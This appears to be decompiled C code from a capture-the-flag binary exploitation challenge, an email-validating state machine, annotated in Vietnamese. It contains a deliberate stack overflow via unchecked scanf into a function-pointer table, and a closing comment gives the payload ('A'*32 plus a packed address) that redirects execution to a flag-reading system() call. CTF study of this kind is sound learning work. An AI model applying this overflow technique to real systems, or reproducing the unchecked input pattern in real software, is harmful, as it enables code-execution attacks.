int __cdecl sub_80485DD(const char *a1)
{
  printf("\nHi %s\n", a1);
  return puts(
           "\n"
           "\t\t\tFinite-State Automaton\n"
           "\n"
           "I have implemented a robust FSA to validate email addresses\n"
           "Throw a string at me and I will let you know if it is a valid email address\n"
           "\n"
           "\t\t\t\tCheers!\n");
}

_BOOL4 __cdecl sub_8048702(char a1)
{
  return a1 > 96 && a1 <= 122 || a1 > 47 && a1 <= 57 || a1 == 95 || a1 == 45 || a1 == 43 || a1 == 46;
}

_BOOL4 __cdecl sub_804874C(char a1)
{
  return a1 > 96 && a1 <= 122 || a1 > 47 && a1 <= 57 || a1 == 95;
}

_BOOL4 __cdecl sub_8048784(char a1)
{
  return a1 > 96 && a1 <= 122;
}

int __cdecl main()
{
  size_t v0; // ebx
  char v2[32]; // [esp+10h] [ebp-74h] BYREF
  _DWORD v3[10]; // [esp+30h] [ebp-54h]
  char s[32]; // [esp+58h] [ebp-2Ch] BYREF
  int v5; // [esp+78h] [ebp-Ch]
  size_t i; // [esp+7Ch] [ebp-8h]

  v5 = 1;

  // Đây là những hàm in ra một chuỗi nào đó
  v3[0] = sub_8048604;
  v3[1] = sub_8048618;
  v3[2] = sub_804862C;
  v3[3] = sub_8048640;
  v3[4] = sub_8048654;
  v3[5] = sub_8048668;
  v3[6] = sub_804867C;
  v3[7] = sub_8048690;
  v3[8] = sub_80486A4;
  v3[9] = sub_80486B8;
  //
  
  puts("What is your name?");
  printf("> ");
  fflush(stdout);
  fgets(s, 32, stdin);
  
  sub_80485DD(s); // Hàm này in một đoạn nội dung

  fflush(stdout);
  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
  fflush(stdout);
  puts("Enter the string to be validate");
  printf("> ");
  fflush(stdout);
  __isoc99_scanf("%s", v2);
  for ( i = 0; ; ++i )
  {
    v0 = i;
    if ( v0 >= strlen(v2) )
      break;
    switch ( v5 )
    {
      case 1:
        if ( sub_8048702(v2[i]) ) // check ĐK
          v5 = 2;
        break;
      case 2:
        if ( v2[i] == 64 )
          v5 = 3;
        break;
      case 3:
        if ( sub_804874C(v2[i]) ) // check ĐK
          v5 = 4;
        break;
      case 4:
        if ( v2[i] == 46 )
          v5 = 5;
        break;
      case 5:
        if ( sub_8048784(v2[i]) ) // check ĐK
          v5 = 6;
        break;
      case 6:
        if ( sub_8048784(v2[i]) )
          v5 = 7;
        break;
      case 7:
        if ( sub_8048784(v2[i]) )
          v5 = 8;
        break;
      case 8:
        if ( sub_8048784(v2[i]) )
          v5 = 9;
        break;
      case 9:
        v5 = 10;
        break;
      default:
        continue;
    }
  }
  ((void (*)(void))v3[--v5])();
  return fflush(stdout);
}

int sub_80486CC() // Hàm này không được gọi tới
{ //=> Mục tiêu là để con trỏ hàm trỏ về hàm này
  char s[58]; // [esp+1Eh] [ebp-3Ah] BYREF

  snprintf(s, 0x32u, "cat %s", "./flag");
  return system(s);
}

// muốn con trỏ trỏ đúng chỗ thì cần làm v5 = 1 để --v5 = 0, v3 nằm ngay sau v2 và có khoảng
// cách 32 kí tự => payload v2 = "A" * 32 + p32(0x80486CC) - chọn "A" vì nếu v2 là kí tự bị filter 
// thì vì v5 thay đổi giá trị từ 1 thành giá trị khác 